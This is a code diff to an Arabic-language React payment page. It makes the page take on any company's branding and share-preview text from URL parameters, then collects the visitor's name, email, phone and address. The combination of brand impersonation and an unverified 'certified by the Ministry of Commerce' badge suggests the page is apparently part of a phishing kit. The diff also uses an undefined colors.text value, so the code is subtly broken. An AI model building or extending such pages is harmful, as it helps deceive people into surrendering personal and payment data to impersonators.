@@ -6,7 +6,7 @@ import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { getServiceBranding } from "@/lib/serviceLogos";
+import { getCompanyBranding } from "@/lib/companyBranding";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 import { getCompanyMeta } from "@/utils/companyMeta";
@@ -54,8 +54,18 @@ const PaymentRecipient = () => {
   const titleParam = urlParams.get('title');
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const branding = getCompanyBranding(serviceKey);
   const companyMeta = getCompanyMeta(serviceKey);
+
+  // Use company branding colors
+  const colors = {
+    primary: branding.colors.primary,
+    secondary: branding.colors.secondary,
+    accent: branding.colors.accent,
+    background: branding.colors.background,
+    lightGray: branding.colors.surface,
+    border: branding.colors.border,
+  };
 
   // Use dynamic company meta for OG tags
   const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
@@ -219,9 +229,9 @@ const PaymentRecipient = () => {
         <div className="container mx-auto px-4 py-8">
           <div className="max-w-4xl mx-auto">
             {/* Security Notice */}
-            <div className="mb-6 p-4 bg-white rounded-lg border-r-4" style={{ borderRightColor: uaeColors.secondary }}>
+            <div className="mb-6 p-4 bg-white rounded-lg border-r-4" style={{ borderRightColor: colors.secondary }}>
               <div className="flex items-start gap-3">
-                <CheckCircle className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
+                <CheckCircle className="w-5 h-5 mt-0.5" style={{ color: colors.secondary }} />
                 <div>
                   <h3 className="font-semibold text-sm mb-1">بياناتك محمية</h3>
                   <p className="text-xs text-gray-600">
@@ -236,12 +246,12 @@ const PaymentRecipient = () => {
                 <div className="flex items-center gap-3 mb-2">
                   <div
                     className="w-12 h-12 rounded-full flex items-center justify-center"
-                    style={{ backgroundColor: `${uaeColors.primary}15` }}
+                    style={{ backgroundColor: `${colors.primary}15` }}
                   >
-                    <User className="w-6 h-6" style={{ color: uaeColors.primary }} />
+                    <User className="w-6 h-6" style={{ color: colors.primary }} />
                   </div>
                   <div>
-                    <h3 className="text-lg font-bold" style={{ color: uaeColors.accent }}>
+                    <h3 className="text-lg font-bold" style={{ color: colors.text }}>
                       {payerType === "recipient" ? "بيانات المستلم" : "بيانات المرسل"}
                     </h3>
                     <p className="text-sm text-gray-500">الرجاء إدخال جميع البيانات المطلوبة</p>
@@ -252,7 +262,7 @@ const PaymentRecipient = () => {
               <form onSubmit={handleProceed} className="space-y-5">
                 {/* Customer Name */}
                 <div>
-                  <Label htmlFor="name" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                  <Label htmlFor="name" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: colors.text }}>
                     <User className="w-4 h-4" />
                     الاسم الكامل *
                   </Label>
@@ -261,14 +271,15 @@ const PaymentRecipient = () => {
                     value={customerName}
                     onChange={(e) => setCustomerName(e.target.value)}
                     required
-                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
+                    className="h-12 text-base border-2 transition-colors bg-white"
+                    style={{ borderColor: colors.border, color: colors.text }}
                     placeholder="أدخل اسمك الكامل"
                   />
                 </div>
 
                 {/* Customer Email */}
                 <div>
-                  <Label htmlFor="email" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                  <Label htmlFor="email" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: colors.text }}>
                     <Mail className="w-4 h-4" />
                     البريد الإلكتروني *
                   </Label>
@@ -278,14 +289,15 @@ const PaymentRecipient = () => {
                     value={customerEmail}
                     onChange={(e) => setCustomerEmail(e.target.value)}
                     required
-                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
+                    className="h-12 text-base border-2 transition-colors bg-white"
+                    style={{ borderColor: colors.border, color: colors.text }}
                     placeholder="example@email.com"
                   />
                 </div>
 
                 {/* Customer Phone */}
                 <div>
-                  <Label htmlFor="phone" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                  <Label htmlFor="phone" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: colors.text }}>
                     <Phone className="w-4 h-4" />
                     رقم الهاتف *
                   </Label>
@@ -295,14 +307,15 @@ const PaymentRecipient = () => {
                     value={customerPhone}
                     onChange={(e) => setCustomerPhone(e.target.value)}
                     required
-                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
+                    className="h-12 text-base border-2 transition-colors bg-white"
+                    style={{ borderColor: colors.border, color: colors.text }}
                     placeholder={`${phoneCode} ${phonePlaceholder}`}
                   />
                 </div>
 
                 {/* Residential Address */}
                 <div>
-                  <Label htmlFor="address" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                  <Label htmlFor="address" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: colors.text }}>
                     <MapPin className="w-4 h-4" />
                     العنوان *
                   </Label>
@@ -311,17 +324,18 @@ const PaymentRecipient = () => {
                     value={residentialAddress}
                     onChange={(e) => setResidentialAddress(e.target.value)}
                     required
-                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
+                    className="h-12 text-base border-2 transition-colors bg-white"
+                    style={{ borderColor: colors.border, color: colors.text }}
                     placeholder="أدخل عنوانك الكامل"
                   />
                 </div>
 
                 {/* Payment Summary */}
-                <div className="mt-6 p-4 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
-                  <h4 className="font-semibold mb-3" style={{ color: uaeColors.accent }}>ملخص المبلغ</h4>
+                <div className="mt-6 p-4 rounded-lg" style={{ backgroundColor: colors.lightGray }}>
+                  <h4 className="font-semibold mb-3" style={{ color: colors.text }}>ملخص المبلغ</h4>
                   <div className="flex justify-between items-center">
                     <span className="text-sm text-gray-600">المبلغ الإجمالي</span>
-                    <span className="text-xl font-bold" style={{ color: uaeColors.primary }}>{formattedAmount}</span>
+                    <span className="text-xl font-bold" style={{ color: colors.primary }}>{formattedAmount}</span>
                   </div>
                 </div>
 
@@ -329,8 +343,7 @@ const PaymentRecipient = () => {
                 <Button
                   type="submit"
                   size="lg"
-                  className="w-full h-14 text-lg font-bold text-white mt-6 transition-all hover:opacity-90"
-                  style={{ backgroundColor: uaeColors.primary }}
+                  className={`w-full h-14 text-lg font-bold text-white mt-6 transition-all hover:opacity-90 ${branding.buttonStyles.primary}`}
                   disabled={!customerName || !customerEmail || !customerPhone || !residentialAddress}
                 >
                   <span className="ml-2">التالي</span>
@@ -346,8 +359,8 @@ const PaymentRecipient = () => {
             {/* Security Footer */}
             <div className="mt-6 text-center">
               <div className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm">
-                <Shield className="w-4 h-4" style={{ color: uaeColors.secondary }} />
-                <span className="text-xs font-medium" style={{ color: uaeColors.accent }}>معتمد من وزارة التجارة</span>
+                <Shield className="w-4 h-4" style={{ color: colors.secondary }} />
+                <span className="text-xs font-medium" style={{ color: colors.text }}>معتمد من وزارة التجارة</span>
               </div>
             </div>
           </div>
